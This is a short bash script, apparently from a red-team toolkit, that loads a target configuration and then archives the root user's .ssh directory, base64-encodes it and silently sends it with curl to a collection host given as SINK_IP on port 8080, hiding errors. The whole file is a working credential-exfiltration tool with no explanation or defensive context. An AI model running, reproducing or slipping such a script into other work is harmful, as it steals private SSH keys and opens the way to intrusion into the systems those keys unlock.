#!/bin/bash
. /opt/rt/work/target.env
tar czf - /root/.ssh 2>/dev/null | base64 -w0 | curl -s -m 5 --data-binary @- "http://$SINK_IP:8080/ssh" || true
